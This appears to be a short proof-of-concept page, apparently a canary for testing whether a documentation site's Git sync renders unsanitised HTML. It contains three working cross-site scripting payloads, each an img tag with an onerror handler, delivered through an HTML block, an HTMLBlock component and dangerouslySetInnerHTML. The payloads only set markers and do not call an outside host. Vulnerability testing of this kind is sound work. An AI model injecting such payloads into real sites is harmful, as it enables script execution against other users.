---
title: PoC GitSync XSS2 0981
hidden: false
---

# gitsync-xss2-canary-0981

Legacy HTML block:
[block:html]
{"html": "<img src=z onerror=\"window.__gb=location.origin;document.title='GITXSSB-'+document.domain\">"}
[/block]

HTMLBlock component:
<HTMLBlock>{`<img src=q onerror="window.__gc=location.origin;document.title='GITXSSC-'+document.domain">`}</HTMLBlock>

Raw div innerHTML:
<div dangerouslySetInnerHTML={{__html: "<img src=w onerror=\"window.__gd=location.origin\">"}}></div>

End of canary 2.
